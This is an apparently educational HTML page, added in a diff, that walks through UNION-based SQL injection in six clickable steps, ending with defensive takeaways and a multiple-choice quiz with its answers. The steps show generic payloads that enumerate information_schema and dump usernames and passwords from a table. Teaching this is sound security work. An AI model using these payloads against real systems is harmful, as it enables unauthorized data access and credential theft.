@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLi UNION SELECT Attack Flow</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      padding: 20px;
+    }
+    .step {
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      margin: 20px auto;
+      padding: 20px;
+      max-width: 700px;
+      transition: transform 0.2s;
+      cursor: pointer;
+    }
+    .step:hover {
+      transform: scale(1.02);
+    }
+    .step h2 {
+      color: #2c3e50;
+    }
+    .code {
+      background: #ecf0f1;
+      padding: 10px;
+      border-radius: 5px;
+      font-family: monospace;
+      display: none;
+    }
+    .takeaway {
+      background: #dff0d8;
+      border-left: 5px solid #3c763d;
+      padding: 15px;
+      margin-top: 40px;
+      border-radius: 10px;
+    }
+    .takeaway h2 {
+      color: #3c763d;
+    }
+    .quiz {
+      background: #fff3cd;
+      border-left: 5px solid #856404;
+      padding: 15px;
+      margin-top: 40px;
+      border-radius: 10px;
+    }
+    .quiz h2 {
+      color: #856404;
+    }
+    .quiz button {
+      margin-top: 10px;
+      padding: 8px 12px;
+      font-size: 14px;
+    }
+  </style>
+  <script>
+    function toggleCode(el) {
+      const code = el.querySelector('.code');
+      code.style.display = code.style.display === 'block' ? 'none' : 'block';
+    }
+
+    function checkAnswer(qId, correct) {
+      const answer = document.querySelector('input[name="' + qId + '"]:checked');
+      const result = document.getElementById(qId + '-result');
+      if (!answer) {
+        result.textContent = 'Please select an option.';
+        result.style.color = 'gray';
+        return;
+      }
+      if (answer.value === correct) {
+        result.textContent = 'Correct!';
+        result.style.color = 'green';
+      } else {
+        result.textContent = 'Incorrect.';
+        result.style.color = 'red';
+      }
+    }
+  </script>
+</head>
+<body>
+
+  <h1>Interactive SQLi: UNION SELECT Attack Flow</h1>
+
+  <div class="step" onclick="toggleCode(this)">
+    <h2>1. Find Injectable Input</h2>
+    <p>Test for inputs vulnerable to SQL injection.</p>
+    <div class="code">' OR 1=1--</div>
+  </div>
+
+  <div class="step" onclick="toggleCode(this)">
+    <h2>2. Determine Number of Columns</h2>
+    <p>Use <code>ORDER BY</code> to find how many columns exist.</p>
+    <div class="code">' ORDER BY 3--</div>
+  </div>
+
+  <div class="step" onclick="toggleCode(this)">
+    <h2>3. Match Columns in UNION SELECT</h2>
+    <p>Construct a payload with the same number of columns.</p>
+    <div class="code">' UNION SELECT null,null,null--</div>
+  </div>
+
+  <div class="step" onclick="toggleCode(this)">
+    <h2>4. Identify Displayable Columns</h2>
+    <p>Inject test values to see which ones show on the page.</p>
+    <div class="code">' UNION SELECT 1,2,3--</div>
+  </div>
+
+  <div class="step" onclick="toggleCode(this)">
+    <h2>5. Explore Schema</h2>
+    <p>Use <code>information_schema</code> to find tables and columns.</p>
+    <div class="code">' UNION SELECT null, table_name FROM information_schema.tables--</div>
+  </div>
+
+  <div class="step" onclick="toggleCode(this)">
+    <h2>6. Extract & Dump Target Data</h2>
+    <p>Replace visible columns with real data like usernames and extract data from specific tables such as <code>user_system_data</code>.</p>
+    <div class="code">' UNION SELECT null, user_name, password FROM user_system_data--</div>
+  </div>
+
+  <div class="takeaway">
+    <h2>Top 5 Takeaways</h2>
+    <ol>
+      <li><strong>Recon is Essential:</strong> SQLi starts with testing and probing inputs using tools like <code>ORDER BY</code> and <code>UNION SELECT</code>.</li>
+      <li><strong>Column Count Must Match:</strong> Matching the number and type of columns is key for successful UNION-based injection.</li>
+      <li><strong>Only Visible Columns Leak Data:</strong> Use test values to identify which columns are rendered in the web page response.</li>
+      <li><strong><code>information_schema</code> is a Goldmine:</strong> Allows attackers to discover table and column names before targeted extraction.</li>
+      <li><strong>Defensive Coding Stops Recon Early:</strong> Parameterized queries, WAFs, and logging can catch or block recon activity.</li>
+    </ol>
+  </div>
+
+  <div class="quiz">
+    <h2>Quick Quiz</h2>
+    <p><strong>Which SQL clause is used to determine the number of columns in the original query?</strong></p>
+    <label><input type="radio" name="q1" value="select"> SELECT</label><br>
+    <label><input type="radio" name="q1" value="union"> UNION</label><br>
+    <label><input type="radio" name="q1" value="order"> ORDER BY</label><br>
+    <label><input type="radio" name="q1" value="where"> WHERE</label><br>
+    <button onclick="checkAnswer('q1', 'order')">Check Answer</button>
+    <p id="q1-result"></p>
+  
+    <p><strong>2. What is the purpose of using 'UNION SELECT' in SQL injection?</strong></p>
+    <label><input type="radio" name="q2" value="combine"> Combine results from two queries</label><br>
+    <label><input type="radio" name="q2" value="count"> Count records</label><br>
+    <label><input type="radio" name="q2" value="delete"> Delete records</label><br>
+    <label><input type="radio" name="q2" value="update"> Update rows</label><br>
+    <button onclick="checkAnswer('q2', 'combine')">Check Answer</button>
+    <p id="q2-result"></p>
+
+    <p><strong>3. What database object is commonly queried to enumerate tables and columns?</strong></p>
+    <label><input type="radio" name="q3" value="syslog"> syslog</label><br>
+    <label><input type="radio" name="q3" value="users"> users</label><br>
+    <label><input type="radio" name="q3" value="schema"> information_schema</label><br>
+    <label><input type="radio" name="q3" value="log"> query_log</label><br>
+    <button onclick="checkAnswer('q3', 'schema')">Check Answer</button>
+    <p id="q3-result"></p>
+
+    <p><strong>4. Why is it important to match the number of columns in a UNION SELECT payload?</strong></p>
+    <label><input type="radio" name="q4" value="syntax"> To avoid syntax errors</label><br>
+    <label><input type="radio" name="q4" value="size"> To get more data</label><br>
+    <label><input type="radio" name="q4" value="speed"> To improve speed</label><br>
+    <label><input type="radio" name="q4" value="sort"> To enable sorting</label><br>
+    <button onclick="checkAnswer('q4', 'syntax')">Check Answer</button>
+    <p id="q4-result"></p>
+
+    <p><strong>5. Which mitigation is most effective at stopping SQL injection?</strong></p>
+    <label><input type="radio" name="q5" value="comments"> Removing comments</label><br>
+    <label><input type="radio" name="q5" value="param"> Using parameterized queries</label><br>
+    <label><input type="radio" name="q5" value="hide"> Hiding errors</label><br>
+    <label><input type="radio" name="q5" value="rename"> Renaming tables</label><br>
+    <button onclick="checkAnswer('q5', 'param')">Check Answer</button>
+    <p id="q5-result"></p>
+  
+    <p><strong>6. Which payload is most suitable for numeric-based SQL injection?</strong></p>
+    <label><input type="radio" name="q6" value="str"> ' OR '1'='1</label><br>
+    <label><input type="radio" name="q6" value="num"> 1 OR 1=1</label><br>
+    <label><input type="radio" name="q6" value="union"> ' UNION SELECT NULL,NULL</label><br>
+    <label><input type="radio" name="q6" value="wait"> ' WAITFOR DELAY '00:00:05'</label><br>
+    <button onclick="checkAnswer('q6', 'num', {
+      'str': 'This payload works for string-based injection, not numeric.',
+      'union': 'UNION is a different technique, not specific to numeric injection.',
+      'wait': 'This is a time-based blind SQLi payload, not a numeric injection.'
+    })">Check Answer</button>
+    <p id="q6-result"></p>
+  </div>
+
+</body>
+</html>
